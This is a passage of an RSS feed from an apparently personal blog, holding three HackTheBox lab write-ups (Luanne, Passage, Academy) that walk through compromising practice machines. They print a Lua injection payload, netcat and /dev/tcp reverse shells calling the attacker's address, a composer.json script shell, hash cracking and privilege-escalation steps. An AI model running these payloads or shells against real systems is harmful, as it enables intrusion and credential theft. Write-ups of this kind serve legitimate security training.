      <pubDate>Sat, 27 Mar 2021 00:00:00 +0000</pubDate>
      <guid>https://mohamed-elleuch.me/writeups/htb-luanne/</guid>
      <description>&lt;h1 id=&#34;p-stylecolordarkredinformation-gathering-p&#34;&gt;&lt;p style=&#34;color:DArkRED&#34;&gt;Information Gathering &lt;/p&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;h2 id=&#34;p-stylecolorgreennmap-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nmap scan &lt;/p&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo nmap -sC -sV 10.10.10.218 -v
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;nmap.png&#34;&gt;
&lt;p&gt;As we can see above, We have 3 PORTS open:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Port 22 running OpenSSH 8.0 ; Recent version, no need waste time on it&lt;/li&gt;
&lt;li&gt;Port 80 running nginx ; robots.txt &amp;ndash;&amp;gt; /weather&lt;/li&gt;
&lt;li&gt;Port 9001 running Medusa httpd 1.12 ; If we were on linux i think this should be something to look at&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Skipping the gobuster part, it will only show us robots.txt. I do prefer Dirb when it comes to directory bruteforcing&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;p-stylecolorgreendirb-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Dirb scan &lt;/p&gt;&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;You can clone the SecLists repo from here &lt;a href=&#34;https://github.com/danielmiessler/SecLists&#34;&gt;https://github.com/danielmiessler/SecLists&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We already got  &lt;strong&gt;/weather/&lt;/strong&gt; from the nmap results, let&amp;rsquo;s see enum more&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;dirb -R http://10.10.10.218/weather/ /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt 
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;dirb.png&#34;&gt;
&lt;hr&gt;
&lt;h1 id=&#34;p-stylecolordarkredfootholdp&#34;&gt;&lt;p style=&#34;color:DArkRED&#34;&gt;Foothold&lt;/p&gt;&lt;/h1&gt;
&lt;p&gt;From our previous scans we were able to find&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-url&#34;&gt;http://10.10.10.218/weather/forecast/
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;forecast.png&#34;&gt;
Let&#39;s try it as a GET param
&lt;img src=&#34;get.png&#34;&gt;
Adding a &lt; &#39; &gt; causes an error
&lt;img src=&#34;luaerror.png&#34;&gt;
&lt;blockquote&gt;
&lt;p&gt;Skipping the SQL Injection part as it got me nothing&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Let&amp;rsquo;s now try if we have any potential code injection.
Basically, The idea is to end the current lua command and inject.
Another think to note for lua a comment starts anywhere with a double hyphen ( &amp;ndash; ) and runs until the end of the line.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s first try this payload&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-url&#34;&gt;/weather/forecast?city=London&#39;);print(&amp;quot;\nhi&amp;quot;)--
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;print.png&#34;&gt;
That worked! Let&#39;s try if we can use system commands
&lt;pre&gt;&lt;code class=&#34;language-url&#34;&gt;/weather/forecast?city=London&#39;);print(&amp;quot;\n&amp;quot;);os.execute(&amp;quot;id&amp;quot;)--
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;id.png&#34;&gt;
&lt;p&gt;That worked aswell! Let&amp;rsquo;s now get a reverse shell&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc ip port &amp;gt;/tmp/f
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Final url encoded payload:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-url&#34;&gt;/weather/forecast?city=%4c%6f%6e%64%6f%6e%27%29%3b%70%72%69%6e%74%28%22%5c%6e%22%29%3b%6f%73%2e%65%78%65%63%75%74%65%28%22%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%34%2e%33%39%20%31%32%33%34%20%3e%2f%74%6d%70%2f%66%22%29%2d%2d
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Let&amp;rsquo;s execute it and get a shell on the box
&lt;img src=&#34;foothold.png&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;p-stylecolordarkreduser-privescp&#34;&gt;&lt;p style=&#34;color:darkred&#34;&gt;User PrivEsc&lt;/p&gt;&lt;/h1&gt;
&lt;p&gt;We can see that we have the default  &lt;strong&gt;.htpasswd&lt;/strong&gt; file which can contain potential passwords
&lt;img src=&#34;pass.png&#34;&gt;
Let&amp;rsquo;s see what we got there
&lt;img src=&#34;webapi.png&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;echo &amp;quot;$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0&amp;quot; &amp;gt; hash ; john hash -w=/opt/rockyou.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And we cracked it!
&lt;img src=&#34;best.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s start by viewing the running processes&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;You need to specify the w tag to view the whole command&lt;/p&gt;
&lt;/blockquote&gt;
&lt;img src=&#34;mich.png&#34;&gt;
We can see that the user **r.michaels** is running a local server at port 3001! Let&#39;s exploit this to get his private SSH key!
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;curl http://127.0.0.1:3001/~r.michaels/id_rsa
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;But we get 401 Unauthorized page!&lt;/p&gt;
&lt;img src=&#34;unauth.png&#34;&gt;
Let&#39;s try the credentials that we got earlier
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;curl http://127.0.0.1:3001/~r.michaels/id_rsa --user webapi_user:iamthebest
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;ssh.png&#34;&gt;
And it worked! Let&#39;s login to the user
&lt;img src=&#34;user.png&#34;&gt;
&lt;p&gt;And we grab that user flag!&lt;/p&gt;
&lt;h1 id=&#34;p-stylecolordarkredroot-privescp&#34;&gt;&lt;p style=&#34;color:darkred&#34;&gt;Root PrivEsc&lt;/p&gt;&lt;/h1&gt;
&lt;p&gt;An interesting backups file which contains an encrypted tar.gz file&lt;/p&gt;
&lt;img src=&#34;back.png&#34;&gt;
&lt;p&gt;Because we&amp;rsquo;re on an NetBSD box, we&amp;rsquo;re gonna use netpgp to decrypt then extract its content&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output=backup.tar.gz
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;tar.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s check that .htpasswd file!
&lt;img src=&#34;root.png&#34;&gt;
&lt;code&gt;webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s crack this password with john!&lt;/p&gt;
&lt;img src=&#34;pass_root.png&#34;&gt;
&lt;p&gt;&lt;code&gt;littlebear&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s try to switch to the root user with this password!&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://www.vultr.com/docs/introduction-to-doas-on-NetBSD&#34;&gt;https://www.vultr.com/docs/introduction-to-doas-on-NetBSD&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;doas su
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;roott.png&#34;&gt;
&lt;p&gt;And we rooted the box!&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;p-stylecolordarkredbonus-sectionp&#34;&gt;&lt;p style=&#34;color:darkred&#34;&gt;Bonus Section&lt;/p&gt;&lt;/h1&gt;
&lt;p&gt;Let&amp;rsquo;s see what caused the lua injection!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cat /home/r.michaels/devel/webapi/weather.lua
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Going through the code we can see the injection point!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-lua&#34;&gt;httpd.write(&#39;&amp;quot;error&amp;quot;: &amp;quot;unknown city: &#39; .. city .. &#39;&amp;quot;}&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;basically what we have done is&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-lua&#34;&gt;httpd.write(&#39;&amp;quot;error&amp;quot;: &amp;quot;unknown city: hi&#39;);os.execute(&amp;quot;id&amp;quot;) -- &#39;&amp;quot;}&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;To avoid this kind of injection, we should validate and sanitize the &amp;ldquo;city&amp;rdquo; input. Scanning the city variable for escape characters and special symbols, making a blacklist for any suspicious word {os,execute,print,&amp;hellip;}
Or just by removing the &amp;lsquo;.. city ..&amp;rsquo; part!&lt;/p&gt;
&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
</description>
    </item>
    
    <item>
      <title>HackTheBox - Passage Writeup</title>
      <link>https://mohamed-elleuch.me/writeups/htb-passage/</link>
      <pubDate>Sat, 06 Mar 2021 00:00:00 +0000</pubDate>
      <guid>https://mohamed-elleuch.me/writeups/htb-passage/</guid>
      <description>&lt;h1 id=&#34;p-stylecolorredinformation-gathering-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Information Gathering &lt;/p&gt;&lt;/h1&gt;
&lt;h2 id=&#34;p-stylecolorgreennmap-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nmap scan &lt;/p&gt;&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;rustscan -a 10.10.10.206 -- -A -sC -sV&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Open 10.10.10.206:22
Open 10.10.10.206:80
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|   256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)

80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Passage News

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt; We have two ports open 
	Port 22 : OpenSSH 7.2p2
	Port 80 : Apache httpd 2.4.18
&lt;/p&gt;
&lt;h2 id=&#34;p-stylecolorgreenexploring-the-webserver-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Exploring the WebServer &lt;/p&gt;&lt;/h2&gt;
&lt;p&gt;Let&amp;rsquo;s first add Passage.htb to our hosts file!&lt;/p&gt;
&lt;p&gt;We can see that Fail2Ban is Implemented on the server! So no need to waste our time trying bruteforcing dirs and files&lt;/p&gt;
&lt;img src=&#34;fail2ban.png&#34;&gt; 
&lt;p&gt;What really catchs my eye is&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Powered by CuteNews&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;A simple search on google can reveal the default dir for CuteNews CMS which is /CuteNews/&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s see what we get!
&lt;img src=&#34;cuteCMS.png&#34;&gt;
Nice! We got the CMS version&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Powered by CuteNews 2.1.2&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s find a vulnerability related to this version!&lt;/p&gt;
&lt;h1 id=&#34;p-stylecolorredinitial-foothold-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Initial Foothold &lt;/p&gt;&lt;/h1&gt;
&lt;p&gt;Let&amp;rsquo;s see what searchsploit has for us!&lt;/p&gt;
&lt;img src=&#34;Searchsploit.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s grab that juicy RCE python exploit&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;searchsploit -m php/webapps/48800.py
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And run our script, We only need to provide &lt;b&gt;	http://passage.htb&lt;/b&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python3 48800.py
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;foothold.png&#34;&gt;
&lt;p&gt;And we&amp;rsquo;re on the box!&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s get a proper shell on the box!&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/bin/bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;IP&amp;gt;/&amp;lt;PORT&amp;gt; 0&amp;gt;&amp;amp;1&#39;&lt;/code&gt;&lt;/p&gt;
&lt;img src=&#34;pwncat.png&#34;&gt;
&lt;h1 id=&#34;p-stylecolorreduser-privescp&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;User Privesc&lt;/p&gt;&lt;/h1&gt;
&lt;h2 id=&#34;p-stylecolorgreenpaul-user-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Paul user &lt;/p&gt;&lt;/h2&gt;
&lt;p&gt;Going through the webserver config, I found an interesting directory&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/var/www/html/CuteNews/cdata/users&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Which seem to contain some juicy encoded informations&lt;/p&gt;
&lt;img src=&#34;encoded.png&#34;&gt;
&lt;p&gt;It looks like it&amp;rsquo;s Base64 encoded!
Let&amp;rsquo;s decode it&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;a:1:{s:4:&amp;quot;name&amp;quot;;a:1:{s:5:&amp;quot;admin&amp;quot;;a:8:{s:2:&amp;quot;id&amp;quot;;s:10:&amp;quot;1592483047&amp;quot;;s:4:&amp;quot;name&amp;quot;;s:5:&amp;quot;admin&amp;quot;;s:3:&amp;quot;acl&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:5:&amp;quot;email&amp;quot;;s:17:&amp;quot;nadav@passage.htb&amp;quot;;s:4:&amp;quot;pass&amp;quot;;s:64:&amp;quot;7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1&amp;quot;;s:3:&amp;quot;lts&amp;quot;;s:10:&amp;quot;1592487988&amp;quot;;s:3:&amp;quot;ban&amp;quot;;s:1:&amp;quot;0&amp;quot;;s:3:&amp;quot;cnt&amp;quot;;s:1:&amp;quot;2&amp;quot;;}}}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;a:1:{s:4:&amp;quot;name&amp;quot;;a:1:{s:10:&amp;quot;paul-coles&amp;quot;;a:9:{s:2:&amp;quot;id&amp;quot;;s:10:&amp;quot;1592483236&amp;quot;;s:4:&amp;quot;name&amp;quot;;s:10:&amp;quot;paul-coles&amp;quot;;s:3:&amp;quot;acl&amp;quot;;s:1:&amp;quot;2&amp;quot;;s:5:&amp;quot;email&amp;quot;;s:16:&amp;quot;paul@passage.htb&amp;quot;;s:4:&amp;quot;nick&amp;quot;;s:10:&amp;quot;Paul Coles&amp;quot;;s:4:&amp;quot;pass&amp;quot;;s:64:&amp;quot;e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd&amp;quot;;s:3:&amp;quot;lts&amp;quot;;s:10:&amp;quot;1592485556&amp;quot;;s:3:&amp;quot;ban&amp;quot;;s:1:&amp;quot;0&amp;quot;;s:3:&amp;quot;cnt&amp;quot;;s:1:&amp;quot;2&amp;quot;;}}}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seems like we got nadav and paul&amp;rsquo;s hash password&lt;/p&gt;
&lt;p&gt;It&amp;rsquo;s a sha2-256 hash, we&amp;rsquo;re gonna use Hashcat with the rockyou wordlist to crack them!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;echo &amp;quot;7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1&amp;quot; &amp;gt; hash 
echo &amp;quot;e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd&amp;quot; &amp;gt; hash
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;hashcat -m 1400 hash /opt/rockyou.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seems like we were only able to crack paul&amp;rsquo;s hash!&lt;/p&gt;
&lt;img src=&#34;cracked.png&#34;&gt;
&lt;p&gt;&lt;code&gt;paul:atlanta1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;And grab our user flag&lt;/p&gt;
&lt;h2 id=&#34;p-stylecolorgreennadav-user-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nadav user &lt;/p&gt;&lt;/h2&gt;
&lt;p&gt;We can notice that nadav can access paul&amp;rsquo;s session&lt;/p&gt;
&lt;img src=&#34;ssh.png&#34;&gt;
&lt;p&gt;Let&amp;rsquo;s see if paul&amp;rsquo;s can access nadav&amp;rsquo;s session&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ssh nadav@passage
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;nadav.png&#34;&gt;
&lt;p&gt;It worked!&lt;/p&gt;
&lt;h1 id=&#34;p-stylecolorredroot-privescp&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Root Privesc&lt;/p&gt;&lt;/h1&gt;
&lt;p&gt;Let&amp;rsquo;s first run&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ps -aux
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;To see the current running processes!
&lt;img src=&#34;usb.png&#34;&gt;
What really catches me is that root is running, and that&amp;rsquo;s odd&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/usr/bin/python3 /usr/share/usb-creator/usb-creator-helper
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;A bit a searching/reading from google can lead us to something, which is the ability to get any file we want!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /dev/shm/id_rsa true
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;root1.png&#34;&gt;
&lt;p&gt;And we rooted the box!&lt;/p&gt;
&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
</description>
    </item>
    
    <item>
      <title>HackTheBox - Academy Writeup</title>
      <link>https://mohamed-elleuch.me/writeups/htb-academy/</link>
      <pubDate>Sat, 27 Feb 2021 00:00:00 +0000</pubDate>
      <guid>https://mohamed-elleuch.me/writeups/htb-academy/</guid>
      <description>&lt;h1 id=&#34;p-stylecolorredinformation-gathering-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Information Gathering &lt;/p&gt;&lt;/h1&gt;
&lt;h2 id=&#34;p-stylecolorgreennmap-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nmap scan &lt;/p&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;sudo nmap -sC -sV -T5 -oA nmap -O -A -v 10.10.10.215
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;nmap.png&#34;&gt;
As we see we have 2 ports open &lt;br/&gt;
SSH on port 22 running OpenSSH 8.2p1 &lt;br/&gt;
http on port 80 running httpd 2.4.41 &lt;br/&gt;
&lt;p&gt;we notice as well the academy.htb domain, which we should add to /etc/hosts.&lt;/p&gt;
&lt;h2 id=&#34;p-stylecolorgreengobuster-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Gobuster scan &lt;/p&gt;&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;gobuster dir -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -u http://academy.htb -x php
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;gob.png&#34;&gt;
&lt;h1 id=&#34;p-stylecolorredinitial-footholdp&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Initial Foothold&lt;/p&gt;&lt;/h1&gt;
&lt;h2 id=&#34;p-stylecolorgreenidentifying-the-exploitp&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Identifying the exploit&lt;/p&gt;&lt;/h2&gt;
&lt;p&gt;So basically the first thing that tried was sql injection on &lt;b&gt; admin.php &lt;/b&gt; but that didn&amp;rsquo;t give me any results. as we don&amp;rsquo;t have any potential users let&amp;rsquo;s move on and dig further. &lt;br/&gt;&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s create an account and see if we can find any usernames and intercept it with burp&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST /register.php HTTP/1.1
Host: academy.htb
Content-Length: 53
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://academy.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://academy.htb/register.php
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=sdloh07q837vauvt0oqevack4o
Connection: close
uid=elleuch&amp;amp;password=elleuch&amp;amp;confirm=elleuch&amp;amp;roleid=0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We can notice the &lt;b&gt;roleid&lt;/b&gt;	parameter which is set to 0. we can assume that&amp;rsquo;s assigning a role to the user we&amp;rsquo;re creating. Which basically can be a normal user ( roleid=0 ) or a privileged user ( roleid=1 ).&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s change change 0 to 1 and forward the request and create our privileged user and try to login to &lt;b&gt;/admin.php&lt;/b&gt;&lt;/p&gt;
&lt;img src=&#34;planner.png&#34;&gt;
&lt;p&gt;As we see above the planner leaks to us a subdomain &lt;b&gt;dev-staging-01.academy.htb&lt;/b&gt; &lt;br/&gt;
Let&amp;rsquo;s add it to /etc/hosts and see what we get&lt;/p&gt;
&lt;img src=&#34;laravel.png&#34;&gt;
&lt;p&gt;Errors! That sounds promosing! Scrolling down we can see something really interesting&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;APP_KEY	 &amp;quot;base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We have the APP_KEY! We can abuse &lt;b&gt;Laravel Unserialize Vulnerability CVE-2018-15133 &lt;/b&gt; &lt;br/&gt;
For this exploit we&amp;rsquo;ll be using this script, a pretty easy syntax.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://github.com/aljavier/exploit_laravel_cve-2018-15133/blob/main/pwn_laravel.py
&lt;/code&gt;&lt;/pre&gt;
&lt;img src=&#34;foothold.png&#34;&gt;
&lt;p&gt;And voilÃ  we&amp;rsquo;re on the box&lt;/p&gt;
&lt;h1 id=&#34;p-stylecolorreduser-privescp&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;User Privesc&lt;/p&gt;&lt;/h1&gt;
&lt;p&gt;Now let&amp;rsquo;s start enumarating,We already know that the webserver is running PHP Laravel. &lt;/br&gt;
The first thing we should look at is the &lt;b&gt;.env&lt;/b&gt; file. &lt;/br&gt;
&lt;img src=&#34;env.png&#34;&gt;
And we get a password! &lt;br /&gt;
&lt;code&gt;mySup3rP4s5w0rd!!&lt;/code&gt; &lt;br/&gt;
Let&amp;rsquo;s see if it belongs to any existing user
&lt;img src=&#34;users.png&#34;&gt;
After manually trying to switch to these users, it turns out to be cry0l1t3&amp;rsquo;s password
&lt;img src=&#34;logincry.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Our user is in the &lt;b&gt;adm&lt;/b&gt; group! So basically we can read logs! And also we can read the audit log! We can grab some juicy informations from it&lt;/p&gt;
&lt;img src=&#34;mrb3.png&#34;&gt;
&lt;p&gt;&lt;code&gt;data=6D7262336E5F41634064336D79210A&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Seems we got a password! But it&amp;rsquo;s hex encoded! Let&amp;rsquo;s decode it&lt;/p&gt;
&lt;img src=&#34;pw.png&#34;&gt;
&lt;p&gt;&lt;code&gt;mrb3n_Ac@d3my!&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Seems like it&amp;rsquo;s mrb3n&amp;rsquo;s password!&lt;/p&gt;
&lt;h1 id=&#34;p-stylecolorredroot-privescp&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Root Privesc&lt;/p&gt;&lt;/h1&gt;
&lt;p&gt;Mrb3n can execute &lt;b&gt;/usr/bin/composer&lt;/b&gt; as root!&lt;/p&gt;
&lt;img src=&#34;sudo.png&#34;&gt;
&lt;p&gt;Going through the docs of composer we can find out that we can execute a custom script using composer! we need to create a composer.json first in any folder we want!&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{ 
&amp;quot;scripts&amp;quot;:{&amp;quot;shell&amp;quot;:&amp;quot;/bin/bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.111/4444 0&amp;gt;&amp;amp;1&#39;&amp;quot;}
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We set our listener&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nc -lvnp 4444 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;And execute&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo /usr/bin/composer --working-dir=fake run-script shell
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;root.png&#34; &gt;&lt;/p&gt;
&lt;p&gt;And we rooted the box! &lt;br/&gt;
&lt;code&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
</description>
    </item>
    
  </channel>
</rss>
